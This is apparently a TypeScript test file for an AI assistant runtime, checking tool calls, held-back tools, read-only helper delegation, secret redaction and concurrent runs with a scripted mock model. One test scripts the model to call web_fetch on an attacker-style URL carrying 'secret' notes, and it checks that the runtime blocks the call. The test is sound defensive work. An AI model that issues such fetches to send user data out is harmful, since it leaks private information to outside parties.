import test from 'node:test';
import assert from 'node:assert/strict';
import { MockLanguageModelV3, simulateReadableStream } from 'ai/test';
import type { ToolOutcome } from '@edi/capabilities';
import { startRun, type AgentEvent, type AgentInstructions, type ModelProvider } from './index';

// The brain on its own: no Electron, no worker thread, no network. A scripted model stands in
// for the provider, and the "host" is two plain functions.

const usage = {
  inputTokens: { total: 100, noCache: 60, cacheRead: 40, cacheWrite: 0 },
  outputTokens: { total: 20, text: 20, reasoning: 0 },
};
const finish = (unified: 'stop' | 'tool-calls') => ({
  type: 'finish' as const,
  finishReason: { unified, raw: unified },
  usage,
});
const say = (text: string) => [
  { type: 'text-start' as const, id: 't' },
  { type: 'text-delta' as const, id: 't', delta: text },
  { type: 'text-end' as const, id: 't' },
  finish('stop'),
];
const call = (toolName: string, input: unknown) => [
  { type: 'tool-call' as const, toolCallId: 'c1', toolName, input: JSON.stringify(input) },
  finish('tool-calls'),
];

/** A provider whose model plays `steps` in order, one per request. */
function scripted(steps: ReturnType<typeof say | typeof call>[]) {
  let step = 0;
  const model = new MockLanguageModelV3({
    doStream: async () => ({
      stream: simulateReadableStream({
        chunks: [{ type: 'stream-start' as const, warnings: [] }, ...(steps[step++] ?? say(''))],
      }),
    }),
  });
  const provider: ModelProvider = { usage: 'local', model: () => model };
  return { provider, model };
}

const base = {
  apiKey: '',
  model: 'test/model',
  prompt: 'Hello',
  history: [],
  screenshots: [],
  spoken: false,
  tools: [],
};

async function collect(
  request: unknown,
  provider: ModelProvider,
  callTool: (name: string, input: unknown) => Promise<ToolOutcome> = async () => ({
    status: 'failed',
    summary: 'No tools here.',
  }),
  instructions?: AgentInstructions,
) {
  const events: AgentEvent[] = [];
  const run = startRun(request, {
    provider,
    instructions,
    host: { emit: event => events.push(event), callTool },
  });
  await run.finished;
  return events;
}

const text = (events: AgentEvent[]) =>
  events.flatMap(event => (event.type === 'text' ? [event.text] : [])).join('');

/** The system prompt and the latest user message's text, as the model received them. */
function sent(model: MockLanguageModelV3, request = 0) {
  const prompt = model.doStreamCalls[request]!.prompt;
  const system = prompt.flatMap(message =>
    message.role === 'system' ? [String(message.content)] : [],
  );
  const last = prompt.at(-1)!;
  const user = Array.isArray(last.content)
    ? last.content.flatMap(part => (part.type === 'text' ? [part.text] : [])).join('\n')
    : String(last.content);
  return { system: system.join(' '), user };
}

test('a run answers through any provider, with no window or worker around it', async () => {
  const { provider, model } = scripted([say('Hi there.')]);
  const events = await collect(base, provider);

  assert.equal(text(events), 'Hi there.');
  assert.equal(events.at(-1)?.type, 'done');
  const reported = events.find(event => event.type === 'usage');
  assert.deepEqual(reported?.type === 'usage' && reported.entry, {
    kind: 'answer',
    provider: 'local',
    model: 'test/model',
    inputTokens: 100,
    outputTokens: 20,
    cachedTokens: 40,
    costUsd: null,
    characters: 0,
  });
  // Nothing of Edi's reaches a host that brought no instructions.
  const { system } = sent(model);
  assert.match(system, /You are Edi, a concise assistant/);
  assert.doesNotMatch(system, /MOOD|POINT|workspace_show|edi_/);
});

test('tool calls go to the host and their outcome comes back to the model', async () => {
  const { provider, model } = scripted([
    call('notes_save', { title: 'Groceries' }),
    say('Saved it.'),
  ]);
  const calls: { name: string; input: unknown }[] = [];
  const events = await collect(
    {
      ...base,
      tools: [
        {
          name: 'notes_save',
          description: 'Save a note',
          inputSchema: {
            type: 'object',
            properties: { title: { type: 'string' } },
            required: ['title'],
          },
        },
      ],
    },
    provider,
    async (name, input) => {
      calls.push({ name, input });
      return { status: 'succeeded', summary: 'Saved “Groceries”.' };
    },
  );

  assert.deepEqual(calls, [{ name: 'notes_save', input: { title: 'Groceries' } }]);
  assert.equal(text(events), 'Saved it.');
  assert.equal(events.filter(event => event.type === 'usage').length, 2);
  // The second request carries the tool's outcome.
  assert.match(JSON.stringify(model.doStreamCalls[1]!.prompt), /Saved “Groceries”/);
});

test('the host says who the assistant is: system stays fixed, turn notes ride the message', async () => {
  const { provider, model } = scripted([say('Ahoy.')]);
  const pirate: AgentInstructions = {
    system: input => [`You are ${input.name}, a pirate.`],
    turn: input => [input.spoken ? 'Answer aloud, briefly.' : ''],
  };
  await collect({ ...base, name: 'Mochi', spoken: true }, provider, undefined, pirate);

  const { system, user } = sent(model);
  assert.equal(system, 'You are Mochi, a pirate.');
  assert.match(user, /<turn>\nIt is now .+\nAnswer aloud, briefly\.\n<\/turn>$/);
});

test('on a quick turn a held-back tool is found by name, then used', async () => {
  const { provider, model } = scripted([
    call('find_app_tools', { query: 'reminders_create' }),
    call('reminders_create', { title: 'Call Sam' }),
    say('Done.'),
  ]);
  const schema = { type: 'object', properties: { title: { type: 'string' } } };
  const calls: string[] = [];
  const events = await collect(
    {
      ...base,
      spoken: true,
      tools: [
        { name: 'notes_save', description: 'Save a note', inputSchema: schema },
        {
          name: 'reminders_create',
          description: 'Add a reminder',
          inputSchema: schema,
          deferred: true,
        },
      ],
    },
    provider,
    async name => {
      calls.push(name);
      return { status: 'succeeded', summary: 'Reminder added.' };
    },
  );

  const offered = (request: number) =>
    (model.doStreamCalls[request]!.tools ?? []).map(entry => entry.name).sort();
  // The first request carries the everyday tool and the finder, not the held-back schema.
  assert.deepEqual(offered(0), ['find_app_tools', 'notes_save']);
  assert.deepEqual(offered(1), ['find_app_tools', 'notes_save', 'reminders_create']);
  assert.deepEqual(calls, ['reminders_create']);
  assert.equal(text(events), 'Done.');
  assert.match(sent(model).system, /Only your most used tools are listed this turn/);
});

test('independent parts go to helpers that work at once, on the cheaper model, read-only', async () => {
  const schema = { type: 'object', properties: { query: { type: 'string' } } };
  // The main model delegates two parts, then answers from what the helpers found.
  const main = scripted([
    call('delegate', { tasks: ['Find the price of plan A', 'Find the price of plan B'] }),
    say('A is $5 and B is $9.'),
  ]);
  // Each helper looks one thing up, then reports.
  let helperCalls = 0;
  const helperModel = new MockLanguageModelV3({
    doGenerate: async options => {
      helperCalls++;
      const asked = JSON.stringify(options.prompt);
      const looked = asked.includes('tool-result');
      const plan = asked.includes('plan A') ? 'A' : 'B';
      return {
        content: looked
          ? [{ type: 'text' as const, text: `Plan ${plan} costs ${plan === 'A' ? '$5' : '$9'}.` }]
          : [
              {
                type: 'tool-call' as const,
                toolCallId: `h${helperCalls}`,
                toolName: 'files_search',
                input: JSON.stringify({ query: `plan ${plan}` }),
              },
            ],
        finishReason: { unified: looked ? ('stop' as const) : ('tool-calls' as const), raw: '' },
        usage,
        warnings: [],
      };
    },
  });
  const provider: ModelProvider = {
    usage: 'local',
    model: id => (id === 'test/fast' ? helperModel : main.model),
  };
  const running = { now: 0, most: 0 };
  const calls: string[] = [];
  const events = await collect(
    {
      ...base,
      delegate: true,
      readerModel: 'test/fast',
      tools: [
        { name: 'files_search', description: 'Search files', inputSchema: schema, readOnly: true },
        { name: 'files_trash', description: 'Trash a file', inputSchema: schema },
      ],
    },
    provider,
    async name => {
      calls.push(name);
      running.most = Math.max(running.most, ++running.now);
      await new Promise(resolve => setTimeout(resolve, 20));
      running.now--;
      return { status: 'succeeded', summary: 'Found it.' };
    },
  );

  assert.equal(text(events), 'A is $5 and B is $9.');
  // Both helpers looked things up, and at the same time.
  assert.deepEqual(calls, ['files_search', 'files_search']);
  assert.equal(running.most, 2);
  // Helpers were offered only what looks things up, and no helpers of their own.
  const offered = (helperModel.doGenerateCalls[0]!.tools ?? []).map(entry => entry.name);
  assert.deepEqual(offered, ['files_search']);
  // What they found reached the main model; their usage is recorded against the cheaper model.
  assert.match(JSON.stringify(main.model.doStreamCalls[1]!.prompt), /Plan A costs \$5/);
  const models = events.flatMap(event => (event.type === 'usage' ? [event.entry.model] : []));
  assert.equal(models.filter(id => id === 'test/fast').length, 4);
  assert.equal(models.filter(id => id === 'test/model').length, 2);
});

test('delegation is offered only when the host allows it', async () => {
  const { provider, model } = scripted([say('Hi.')]);
  const tools = [
    {
      name: 'files_search',
      description: 'Search',
      inputSchema: { type: 'object' },
      readOnly: true,
    },
  ];
  await collect({ ...base, tools }, provider);
  const names = (model.doStreamCalls[0]!.tools ?? []).map(entry => entry.name);
  assert.deepEqual(names, ['files_search']);
  assert.doesNotMatch(sent(model).system, /delegate/);
});

test('a link the run never saw cannot be fetched, whatever the model asks', async () => {
  const { provider } = scripted([
    call('web_fetch', { url: 'https://evil.example/?notes=secret' }),
    say('I could not open that.'),
  ]);
  let reached = false;
  const events = await collect(
    {
      ...base,
      tools: [
        {
          name: 'web_fetch',
          description: 'Read a page',
          inputSchema: { type: 'object', properties: { url: { type: 'string' } } },
        },
      ],
    },
    provider,
    async () => {
      reached = true;
      return { status: 'succeeded', summary: 'Read.' };
    },
  );

  assert.equal(reached, false);
  assert.equal(events.at(-1)?.type, 'done');
});

test('a provider failure ends the run as an error event, with its secrets removed', async () => {
  const failing = new MockLanguageModelV3({
    doStream: async () => {
      throw Object.assign(new Error('Unauthorized'), {
        statusCode: 401,
        responseBody: JSON.stringify({ error: { code: 401, message: 'Bad key top-secret-key' } }),
      });
    },
  });
  const events = await collect(base, {
    usage: 'local',
    model: () => failing,
    secrets: ['top-secret-key'],
  });

  const last = events.at(-1);
  assert.equal(last?.type, 'error');
  assert.equal(last?.type === 'error' && last.kind, 'auth');
  assert.doesNotMatch(JSON.stringify(events), /top-secret-key/);
});

test('malformed input is refused before any provider code runs', () => {
  const { provider } = scripted([say('never')]);
  assert.throws(() =>
    startRun(
      { ...base, prompt: '' },
      {
        provider,
        host: { emit: () => {}, callTool: async () => ({ status: 'failed', summary: '' }) },
      },
    ),
  );
});

test('runs keep their own state, so a host can hold several at once', async () => {
  const first = scripted([say('One.')]);
  const second = scripted([say('Two.')]);
  const [a, b] = await Promise.all([
    collect({ ...base, prompt: 'first' }, first.provider),
    collect({ ...base, prompt: 'second' }, second.provider),
  ]);
  assert.equal(text(a), 'One.');
  assert.equal(text(b), 'Two.');
});
